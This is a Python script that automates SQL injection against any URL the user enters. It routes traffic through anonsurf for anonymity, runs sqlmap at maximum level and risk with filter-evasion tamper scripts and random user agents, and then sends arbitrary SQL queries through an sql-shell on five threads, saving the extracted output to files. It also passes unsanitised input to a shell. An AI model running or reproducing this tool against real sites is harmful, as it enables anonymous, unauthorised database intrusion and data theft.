import subprocess
import threading
import queue

# Function to run a command and capture its output
def run_command(command):
    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    output, error = process.communicate()
    return output.decode(), error.decode()

# Function to execute additional SQL commands
def execute_sql_commands(url, sql_commands_queue, results_queue):
    while True:
        command = sql_commands_queue.get()
        if command is None:
            break

        # Validate the additional SQL command
        if not command:
            results_queue.put((command, None, "Invalid command. Please enter a valid SQL command."))
            continue

        # Build and run the additional sqlmap command
        additional_command_options = "--random-agent --tamper=apostrophemask,space2comment --level=5 --risk=3"
        additional_command_sqlmap = f"sqlmap --url {url} --sql-shell --sql-query \"{command}\" {additional_command_options}"
        output, error = run_command(additional_command_sqlmap)
        results_queue.put((command, output, error))

# Start anonsurf
start_anonsurf = "sudo anonsurf start"
run_command(start_anonsurf)

# Get URL from user
url = input("Enter URL: ")

# Build and run the sqlmap command
sqlmap_options = "--random-agent --tamper=apostrophemask,space2comment --level=5 --risk=3"
sqlmap_command = f"sqlmap --url {url} {sqlmap_options}"
output, error = run_command(sqlmap_command)

# Print the output and error messages
print("Output:")
print(output)
print("Error:")
print(error)

# Create queues for SQL commands and results
sql_commands_queue = queue.Queue()
results_queue = queue.Queue()

# Create worker threads for executing SQL commands
num_threads = 5  # Number of worker threads
threads = []
for _ in range(num_threads):
    thread = threading.Thread(target=execute_sql_commands, args=(url, sql_commands_queue, results_queue))
    thread.start()
    threads.append(thread)

# Allow user to input additional SQL commands
while True:
    additional_command = input("Enter additional SQL command (or 'q' to quit): ")
    if additional_command.lower() == 'q':
        break

    # Add command to the queue
    sql_commands_queue.put(additional_command)

# Add None sentinel value to the queue to signal worker threads to stop
for _ in range(num_threads):
    sql_commands_queue.put(None)

# Wait for all worker threads to finish
for thread in threads:
    thread.join()

# Process the results
while not results_queue.empty():
    command, result_output, result_error = results_queue.get()
    print(f"Command: {command}")
    print("Output:")
    print(result_output)
    print("Error:")
    print(result_error)
    print()

    # Ask user if they want to save the output to a file
    save_file = input("Do you want to save the output to a file? (y/n): ")
    if save_file.lower() == 'y':
        file_name = input("Enter the file name: ")
        try:
            with open(file_name, 'w') as f:
                f.write(result_output)
            print(f"Output saved to {file_name}.")
        except IOError:
            print("An error occurred while saving the output.")
